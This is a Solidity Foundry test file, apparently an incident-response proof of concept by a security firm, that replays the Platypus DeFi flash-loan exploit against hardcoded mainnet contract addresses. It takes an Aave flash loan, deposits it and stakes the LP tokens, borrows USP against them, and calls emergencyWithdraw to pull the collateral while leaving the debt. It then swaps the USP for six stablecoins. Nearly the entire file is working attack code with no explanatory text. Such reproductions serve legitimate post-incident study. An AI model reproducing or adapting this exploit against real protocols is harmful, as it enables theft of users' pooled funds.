// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
//platypusdefi flashloan attack poc
//tx：https://snowtrace.io/tx/0x1266a937c2ccd970e5d7929021eed3ec593a95c68a99b4920c2efa226679b430
//twitter：https://twitter.com/Platypusdefi/status/1626396538611310592
//Copyright Reserved by Numen Cyber Technology：https://twitter.com/numencyber
import "forge-std/Test.sol";
import "../src/Counter.sol";

interface AAVEPOOLV3{
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}
interface USDC{
    function approve(address spender, uint256 value)
    external
    returns (bool);
    function balanceOf(address account)
    external
    view
    returns (uint256);
}
interface POOL{
    function deposit(
        address token,
        uint256 amount,
        address to,
        uint256 deadline
    ) external returns (uint256 liquidity);
    function withdraw(
        address token,
        uint256 liquidity,
        uint256 minimumAmount,
        address to,
        uint256 deadline
    ) external returns (uint256 amount);
    function swap(
        address fromToken,
        address toToken,
        uint256 fromAmount,
        uint256 minimumToAmount,
        address to,
        uint256 deadline
    ) external returns (uint256 actualToAmount, uint256 haircut);
}
interface LPUSDC{
    function balanceOf(address account)
    external
    view
    returns (uint256);
    function approve(address spender, uint256 value)
    external
    returns (bool);
}
interface MasterPlatypusV4{
    function deposit(uint256 _pid, uint256 _amount)
    external
    returns (uint256 reward, uint256[] memory additionalRewards);
    function emergencyWithdraw(uint256 _pid) external;
}
interface PlatypusTreasure{
    struct PositionView {
        uint256 collateralAmount;
        uint256 collateralUSD;
        uint256 borrowLimitUSP;
        uint256 liquidateLimitUSP;
        uint256 debtAmountUSP;
        uint256 debtShare;
        uint256 healthFactor; // `healthFactor` is 0 if `debtAmountUSP` is 0
        bool liquidable;
    }
    function positionView(address _user, address _token) external view returns (PositionView memory);
    function borrow(address _token, uint256 _borrowAmount) external;
}
interface USP{
    function balanceOf(address account)
    external
    view
    returns (uint256);
    function approve(address spender, uint256 value)
    external
    returns (bool);
}
interface USDCE{
    function balanceOf(address account)
    external
    view
    returns (uint256);
    function approve(address spender, uint256 value)
    external
    returns (bool);
}
interface USDT{
    function balanceOf(address account)
    external
    view
    returns (uint256);
    function approve(address spender, uint256 value)
    external
    returns (bool);
}
interface USDTE{
    function balanceOf(address account)
    external
    view
    returns (uint256);
    function approve(address spender, uint256 value)
    external
    returns (bool);
}
interface BUSD{
    function balanceOf(address account)
    external
    view
    returns (uint256);
    function approve(address spender, uint256 value)
    external
    returns (bool);
}
interface DAIE{
    function balanceOf(address account)
    external
    view
    returns (uint256);
    function approve(address spender, uint256 value)
    external
    returns (bool);
}
contract CounterTest is Test {

    function setUp() public {

    }
    USDC usdc=USDC(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);
    AAVEPOOLV3 aavepoolv3=AAVEPOOLV3(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    POOL pool=POOL(0x66357dCaCe80431aee0A7507e2E361B7e2402370);
    LPUSDC lpusdc=LPUSDC(0xAEf735B1E7EcfAf8209ea46610585817Dc0a2E16);
    MasterPlatypusV4 masterplatypusv4=MasterPlatypusV4(0xfF6934aAC9C94E1C39358D4fDCF70aeca77D0AB0);
    PlatypusTreasure platypustreasure=PlatypusTreasure(0x061da45081ACE6ce1622b9787b68aa7033621438);
    USP usp=USP(0xdaCDe03d7Ab4D81fEDdc3a20fAA89aBAc9072CE2);
    USDCE usdce=USDCE(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664);
    USDT usdt=USDT(0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7);
    USDTE usdte=USDTE(0xc7198437980c041c805A1EDcbA50c1Ce5db95118);
    BUSD busd=BUSD(0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39);
    DAIE daie=DAIE(0xd586E7F844cEa2F87f50152665BCbc2C279D8d70);
    function testa() public{
        aavepoolv3.flashLoanSimple(address(this),address(usdc),44000000000000,hex"00",0);
        console2.log(usdc.balanceOf(address(this)));
        console2.log(usdce.balanceOf(address(this)));
        console2.log(usdt.balanceOf(address(this)));
        console2.log(usdte.balanceOf(address(this)));
        console2.log(busd.balanceOf(address(this)));
        console2.log(daie.balanceOf(address(this)));
        console2.log(usp.balanceOf(address(this)));
    }
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool){
        usdc.approve(address(aavepoolv3),type(uint256).max);
        uint256 r1=usdc.balanceOf(address(this));
        usdc.approve(address(pool),type(uint256).max);
        uint256 r2=pool.deposit(address(usdc),r1,address(this),block.timestamp);
        lpusdc.balanceOf(address(address(this)));
        lpusdc.approve(address(masterplatypusv4),type(uint256).max);
        masterplatypusv4.deposit(4,r2);
        PlatypusTreasure.PositionView memory s=PlatypusTreasure.PositionView({
            collateralAmount:0,
            collateralUSD:0,
            borrowLimitUSP:0,
            liquidateLimitUSP:0,
            debtAmountUSP:0,
            debtShare:0,
            healthFactor:0,
            liquidable:true
        });
        s=platypustreasure.positionView(address(this),address(lpusdc));
        platypustreasure.borrow(address(lpusdc),s.borrowLimitUSP);
        masterplatypusv4.emergencyWithdraw(4);
        uint256 r3=lpusdc.balanceOf(address(this));
        pool.withdraw(address(usdc),r3,0,address(this),block.timestamp);
        uint256 r4=usp.balanceOf(address(this));
        console2.log(r3);
        console2.log(r4);
        usp.approve(address(pool),type(uint256).max);
        pool.swap(address(usp),address(usdc),2500000000000000000000000,0,address(this),block.timestamp);
        pool.swap(address(usp),address(usdce),2000000000000000000000000,0,address(this),block.timestamp);
        pool.swap(address(usp),address(usdt),1600000000000000000000000,0,address(this),block.timestamp);
        pool.swap(address(usp),address(usdte),1250000000000000000000000,0,address(this),block.timestamp);
        pool.swap(address(usp),address(busd),700000000000000000000000,0,address(this),block.timestamp);
        pool.swap(address(usp),address(daie),700000000000000000000000,0,address(this),block.timestamp);
        usdc.balanceOf(address(this));
        usdce.balanceOf(address(this));
        usdt.balanceOf(address(this));
        usdte.balanceOf(address(this));
        busd.balanceOf(address(this));
        daie.balanceOf(address(this));
        uint r5=usp.balanceOf(address(this));
        console2.log(r5);
        return true;
    }
}
